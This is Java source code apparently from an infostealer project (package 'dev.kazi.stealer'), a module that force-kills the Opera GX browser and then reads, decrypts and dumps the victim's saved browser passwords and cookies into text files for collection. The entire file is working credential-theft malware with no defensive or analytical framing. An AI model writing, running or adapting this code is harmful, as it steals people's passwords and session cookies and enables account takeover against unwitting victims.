package dev.kazi.stealer.node.nodes.impl.browser;

import dev.kazi.stealer.utils.decrypt.password.PasswordDecrypt;
import dev.kazi.stealer.utils.decrypt.cookie.CookieDecrypt;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.File;
import java.io.IOException;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class OperaGX extends Node {

    public OperaGX() throws IOException {
        super(Category.FILE);
        Runtime.getRuntime().exec("taskkill /f /im operagx.exe");
    }
    
    @Override
    public void createNode() {
        try {
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies").exists()) {
                this.cookie();
            }
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Web Data").exists()) {}
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data").exists()) {
                this.password();
            }
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public void cookie() throws IOException {
        if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies").exists()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "Cookies") + "\\OperaGX.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new CookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State").getCookies().getData());
            bufferedWriter.close();
        }
    }
    
    public void password() throws IOException {
        if (!new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State").getPasswords().getData().isEmpty()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "General\\PasswordsOperaGX.txt"), true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State").getPasswords().getData());
            bufferedWriter.close();
        }
    }
}
